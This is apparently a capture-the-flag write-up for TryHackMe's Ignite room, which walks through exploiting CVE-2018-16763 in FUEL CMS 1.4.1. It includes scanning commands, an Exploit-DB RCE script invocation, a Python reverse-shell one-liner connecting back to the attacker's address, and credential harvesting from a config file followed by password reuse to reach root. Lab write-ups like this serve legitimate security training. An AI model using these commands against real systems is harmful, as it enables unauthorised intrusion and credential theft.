# Ignite - TryHackMe Write-up

<p align="center">
  <img src="https://tryhackme.com/img/logo/tryhackme_logo_full.svg" width="300">
</p>

**Room:** [Ignite](https://tryhackme.com/room/ignite)  
**Difficulty:** Easy  
**OS:** Linux  
**Status:** ✅ Completed 


---

## Table of Contents

- [Overview](#overview)
- [01 - Reconnaissance](#01---reconnaissance)
- [02 - Enumeration](#02---enumeration)
- [03 - Exploitation](#03---exploitation)
- [04 - Post-Exploitation](#04---post-exploitation)
- [05 - Privilege Escalation](#05---privilege-escalation)
- [06 - Flags](#06---flags)
- [Tools Used](#tools-used)
- [Lessons Learned](#lessons-learned)

---

## Overview

Ignite is an easy-rated room on TryHackMe that focuses on exploiting a known vulnerability in **FUEL CMS v1.4.1**. The room teaches basic enumeration, web application exploitation, and Linux privilege escalation.

> ⚠️ **Disclaimer:** This write-up is for educational purposes only. Do not use these techniques on systems you do not own or have explicit permission to test.

---

## 01 - Reconnaissance

### Target Information

| Field | Value |
|-------|-------|
| Target IP | `10.10.XXX.XXX` |
| Local IP | `10.9.XXX.XXX` |

### Nmap Scan

```bash
nmap -sC -sV -oN 01-reconnaissance/nmap_initial.txt 10.10.XXX.XXX
```

**Results:**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

**Key Findings:**
- Only port 80 (HTTP) is open
- Running Apache 2.4.18 on Ubuntu
- Website title reveals **FUEL CMS**

### Full Port Scan

```bash
nmap -T4 -A -sV -p- -oN 01-reconnaissance/nmap_full.txt 10.10.XXX.XXX
```

No additional ports found.

---

## 02 - Enumeration

### Web Enumeration

**Homepage Analysis:**
- Default FUEL CMS landing page
- Version disclosed: **FUEL CMS 1.4.1**
- Admin panel located at: `/fuel`

### Directory Enumeration

```bash
gobuster dir -u http://10.10.XXX.XXX -w /usr/share/wordlists/dirb/common.txt -o 02-enumeration/gobuster.txt
```

**Interesting Directories Found:**
- `/fuel` - Admin login page
- `/fuel/pages` - Pages management
- `/assets` - Static assets

### Technology Stack

| Technology | Version |
|------------|---------|
| FUEL CMS | 1.4.1 |
| Apache | 2.4.18 |
| PHP | 5.x/7.x |
| OS | Ubuntu |

### Vulnerability Research

Searching for known vulnerabilities in FUEL CMS 1.4.1:

```bash
searchsploit fuel cms 1.4.1
```

**Found:**
- **CVE-2018-16763** - FUEL CMS 1.4.1 - Remote Code Execution (RCE)

---

## 03 - Exploitation

### Vulnerability Details

| Field | Value |
|-------|-------|
| CVE | CVE-2018-16763 |
| Type | Remote Code Execution (RCE) |
| Affected | FUEL CMS <= 1.4.1 |
| CVSS | 9.8 (Critical) |

**Root Cause:**
Improper input validation in the `/pages/select` filter parameter and `/preview` data parameter allows attackers to inject and execute arbitrary PHP code.

### Exploitation Steps

**Step 1:** Download the exploit script

```bash
searchsploit -m php/webapps/50477.py
cp 50477.py scripts/fuel_cms_rce.py
```

**Step 2:** Run the exploit

```bash
python3 scripts/fuel_cms_rce.py -u http://10.10.XXX.XXX
```

**Step 3:** Gain reverse shell

Using the exploit's built-in shell or crafting a Python reverse shell:

```bash
# Start listener
nc -lvnp 1234

# Execute reverse shell via RCE
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.XXX.XXX",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Initial Access Achieved ✅

```
$ whoami
www-data

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 04 - Post-Exploitation

### System Enumeration

```bash
# Operating System
cat /etc/os-release
# Ubuntu 16.04.7 LTS (Xenial Xerus)

# Kernel version
uname -a
# Linux ubuntu 4.15.0-45-generic

# Users
cat /etc/passwd | grep /bin/bash
# root, www-data
```

### Interesting Files

```bash
# FUEL CMS configuration
cat /var/www/html/fuel/application/config/database.php
```

**Database Credentials Found:**
```php
$db['default'] = array(
    'dsn'   => '',
    'hostname' => 'localhost',
    'username' => 'root',
    'password' => 'mememe',
    'database' => 'fuel_schema',
    ...
);
```

### Database Access

```bash
mysql -u root -p -e "SHOW DATABASES;"
# Password: mememe
```

---

## 05 - Privilege Escalation

### Enumeration

```bash
# Check sudo privileges
sudo -l
# (www-data has no sudo privileges)

# Check SUID binaries
find / -perm -u=s 2>/dev/null

# Check kernel exploits
uname -r
# 4.15.0-45-generic
```

### Privilege Escalation Vector

**Method:** Exploiting weak file permissions / credential reuse

The MySQL root password `mememe` was found in the FUEL CMS configuration file. Testing password reuse:

```bash
su root
Password: mememe
```

**Root Access Achieved ✅**

```
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 06 - Flags

| Flag | Location | Status |
|------|----------|--------|
| User Flag | `/home/www-data/flag.txt` | ✅ Captured |
| Root Flag | `/root/root.txt` | ✅ Captured |

<details>
<summary>Click to reveal flags</summary>

**User Flag:**
```
THM{XXXXXXXXXXXXXXXXXXXXXXXX}
```

**Root Flag:**
```
THM{YYYYYYYYYYYYYYYYYYYYYYYY}
```

</details>

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| gobuster | Directory brute-forcing |
| searchsploit | Exploit database search |
| netcat | Reverse shell listener |
| Python 3 | Running exploit scripts |

---

## Lessons Learned

1. **Version Disclosure:** Always check the homepage source and banners for version information - it can lead directly to known vulnerabilities.

2. **Credential Reuse:** The root password was the same as the MySQL password. Never reuse passwords across services.

3. **Configuration Files:** Web application config files often contain plaintext credentials. Always check them during post-exploitation.

4. **CVE Research:** When you identify a specific software version, immediately search for associated CVEs before attempting manual exploitation.

5. **Input Validation:** This vulnerability existed because of improper input validation - a fundamental security principle that was overlooked.

---

## References

- [TryHackMe - Ignite Room](https://tryhackme.com/room/ignite)
- [CVE-2018-16763 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-16763)
- [FUEL CMS Official Site](https://www.getfuelcms.com/)

---

<p align="center">
  <b>Happy Hacking! 🚩</b>
</p>
